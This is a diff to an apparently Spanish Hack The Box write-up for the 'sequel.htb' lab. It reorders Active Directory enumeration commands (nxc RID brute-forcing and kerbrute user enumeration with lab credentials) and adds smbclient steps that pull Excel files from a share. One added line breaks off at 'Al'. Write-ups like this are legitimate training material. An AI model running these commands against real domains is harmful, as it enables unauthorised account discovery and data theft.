@@ -33,6 +33,20 @@ Añadimos al `/etc/hosts` la IP y el dominio `10.129.232.128  sequel.htb dc01 dc
 nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
 ```
 
+
+### Enumeración de usuarios existentes
+
+```shell
+nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --rid-brute  | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2-2 | tee users.txt
+```
+
+
+### Enumeración de usuarios validos
+
+```shell
+kerbrute userenum --dc 10.129.232.128 -d sequel.htb users.txt
+```
+
 ### Enumeramos los recursos compartidos en red
 
 ```shell
@@ -51,26 +65,26 @@ SYSVOL          READ            Logon server share
 Users           READ            
 ```
 
-### Enumeración de usuarios existentes
-
- 
+Accedemos a `Accounting Department`
 ```shell
-nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --rid-brute  | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2-2 | tee users.txt
+smbclient //10.129.232.128/"Accounting Department" -U 'rose%KxEPkKe6R8su'
 ```
 
-
-### Enumeración de usuarios validos
-
+Nos traemos dos ficheros excel que vemos
 ```shell
-kerbrute userenum --dc 10.129.232.128 -d sequel.htb users.txt
+get accounting_2024.xlsx
 ```
 
-
-### Enumeración de forma recursiva
-
 ```shell
-nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' -M spider_plus
+get accounts.xlsx
 ```
+
+Vemos que tipo de archivo es
+```shell
+file accounts.xlsx
+```
+
+Al
 
 # Explotación
 ## AS-REP Roasting Attack
